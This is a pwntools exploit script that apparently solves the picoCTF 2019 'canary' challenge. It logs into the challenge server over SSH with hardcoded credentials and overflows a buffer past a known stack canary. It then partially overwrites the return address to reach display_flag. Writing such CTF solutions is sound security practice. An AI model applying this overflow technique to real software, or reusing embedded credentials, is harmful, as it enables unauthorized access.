#!/usr/bin/env python2
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '2019shell1.picoctf.com'
port = int(args.PORT or 22)
user = args.USER or 'NullVoid'
password = args.PASSWORD or 'a1b2c3d4'
remote_path = '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

#io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

#io.interactive()

import os
import string

if shell is not None:
    shell.set_working_directory(os.path.dirname(remote_path))

BUF_SIZE = 32
FLAG_LEN = 64
KEY_LEN = 4

try:
    canary = "wrvW"
    #payload = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
    payload = fit({0x8: p16(exe.symbols["display_flag"])}, filler = 'B')
    
    padd = ('A' * BUF_SIZE)
    padd += canary
    padd += payload

    paddlen = str(len(padd) + 1)
    
    with context.local(log_level='ERROR'):
        try:
            io = start()
            print("Input: {}, Size: {}".format(padd, paddlen))
            print("Sending payload: \n{}".format(hexdump(payload)))
            io.sendlineafter("Please enter the length of the entry:\n> ", paddlen)
            io.sendlineafter("Input> ", padd)
            response = io.recvall()
            print(response)
        finally:
            io.close()
except KeyboardInterrupt:
	print('Exit')
